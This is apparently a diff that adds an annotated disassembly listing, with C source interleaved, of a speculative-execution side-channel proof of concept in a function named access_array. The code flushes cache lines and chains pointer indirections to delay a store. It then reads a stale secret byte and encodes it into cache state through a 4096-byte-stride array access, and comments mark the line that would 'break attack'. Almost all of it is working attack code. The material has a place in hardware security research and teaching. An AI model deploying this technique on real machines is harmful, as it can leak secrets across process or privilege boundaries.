@@ -1,0 +1,146 @@
+000000000040186f <access_array>:
+
+// ---------------------------------------------------------------------------
+
+
+
+void access_array(int x) {
+  40186f:	55                   	push   %rbp
+  401870:	48 89 e5             	mov    %rsp,%rbp
+  401873:	48 83 ec 70          	sub    $0x70,%rsp
+  401877:	89 7d 9c             	mov    %edi,-0x64(%rbp)
+  40187a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+  401881:	00 00
+  401883:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+  401887:	31 c0                	xor    %eax,%eax
+    int tmp;
+    // store secret in data
+    strcpy(data, SECRET);
+  401889:	48 8b 05 70 22 10 00 	mov    0x102270(%rip),%rax        # 503b00 <data>
+  401890:	c7 00 53 45 43 00    	movl   $0x434553,(%rax)
+}
+
+extern __inline void __attribute__((__gnu_inline__, __always_inline__, __artificial__))
+_mm_mfence (void)
+{
+  __builtin_ia32_mfence ();
+  401896:	0f ae f0             	mfence
+}
+  401899:	90                   	nop
+    // flushing the data which is used in the condition increases
+    // probability of speculation
+    _mm_mfence();
+    char** data_slowptr = &data;
+  40189a:	48 8d 05 5f 22 10 00 	lea    0x10225f(%rip),%rax        # 503b00 <data>
+  4018a1:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
+    char*** data_slowslowptr = &data_slowptr;
+  4018a5:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
+  4018a9:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
+    char**** data_ultraslowptr = &data_slowslowptr;
+  4018ad:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
+  4018b1:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
+  __builtin_ia32_mfence ();
+  4018b5:	0f ae f0             	mfence
+}
+  4018b8:	90                   	nop
+  4018b9:	48 8d 45 9c          	lea    -0x64(%rbp),%rax
+  4018bd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+  __builtin_ia32_clflush (__A);
+  4018c1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+  4018c5:	0f ae 38             	clflush (%rax)
+}
+  4018c8:	90                   	nop
+    _mm_mfence();
+    _mm_clflush(&x);
+    _mm_clflush(data_slowptr);
+  4018c9:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
+  4018cd:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
+  __builtin_ia32_clflush (__A);
+  4018d1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+  4018d5:	0f ae 38             	clflush (%rax)
+}
+  4018d8:	90                   	nop
+  4018d9:	48 8d 45 a8          	lea    -0x58(%rbp),%rax
+  4018dd:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
+  __builtin_ia32_clflush (__A);
+  4018e1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
+  4018e5:	0f ae 38             	clflush (%rax)
+}
+  4018e8:	90                   	nop
+    _mm_clflush(&data_slowptr);
+    _mm_clflush(data_slowslowptr);
+  4018e9:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
+  4018ed:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
+  __builtin_ia32_clflush (__A);
+  4018f1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
+  4018f5:	0f ae 38             	clflush (%rax)
+}
+  4018f8:	90                   	nop
+  4018f9:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
+  4018fd:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
+  __builtin_ia32_clflush (__A);
+  401901:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
+  401905:	0f ae 38             	clflush (%rax)
+}
+  401908:	90                   	nop
+    _mm_clflush(&data_slowslowptr);
+    _mm_clflush(data_ultraslowptr);
+  401909:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
+  40190d:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
+  __builtin_ia32_clflush (__A);
+  401911:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
+  401915:	0f ae 38             	clflush (%rax)
+}
+  401918:	90                   	nop
+  401919:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
+  40191d:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
+  __builtin_ia32_clflush (__A);
+  401921:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
+  401925:	0f ae 38             	clflush (%rax)
+}
+  401928:	90                   	nop
+  __builtin_ia32_mfence ();
+  401929:	0f ae f0             	mfence
+}
+  40192c:	90                   	nop
+    _mm_mfence();
+
+    // overwrite data via different pointer
+    // pointer chasing makes this extremely slow
+    (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
+  40192d:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
+  401931:	48 8b 00             	mov    (%rax),%rax
+  401934:	48 8b 00             	mov    (%rax),%rax
+  401937:	48 8b 10             	mov    (%rax),%rdx
+  40193a:	8b 45 9c             	mov    -0x64(%rbp),%eax
+  40193d:	48 98                	cltq
+  40193f:	48 01 d0             	add    %rdx,%rax
+  401942:	c6 00 23             	movb   $0x23,(%rax)
+    tmp = *(mem + data[x]*4096);
+  401945:	48 8b 15 bc 21 10 00 	mov    0x1021bc(%rip),%rdx        # 503b08 <mem> // obtain address of <mem>
+  40194c:	48 8b 0d ad 21 10 00 	mov    0x1021ad(%rip),%rcx        # 503b00 <data> // obtain address of <data>
+  401953:	8b 45 9c             	mov    -0x64(%rbp),%eax
+  401956:	48 98                	cltq
+  401958:	48 01 c8             	add    %rcx,%rax // reg-reg addition
+  40195b:	0f b6 00             	movzbl (%rax),%eax // move address contained in rax to eax
+  40195e:	0f be c0             	movsbl %al,%eax
+  401961:	c1 e0 0c             	shl    $0xc,%eax
+  401964:	48 98                	cltq
+  401966:	48 01 d0             	add    %rdx,%rax
+  401969:	0f b6 00             	movzbl (%rax),%eax
+  40196c:	0f be c0             	movsbl %al,%eax
+  40196f:	89 45 a4             	mov    %eax,-0x5c(%rbp)
+    // uncomment next line to break attack
+    //_mm_mfence();
+    // Encode stale value in the cache
+
+
+}
+  401972:	90                   	nop
+  401973:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  401977:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
+  40197e:	00 00
+  401980:	74 05                	je     401987 <access_array+0x118>
+  401982:	e8 e9 69 01 00       	call   418370 <__stack_chk_fail>
+  401987:	c9                   	leave
+  401988:	c3                   	ret
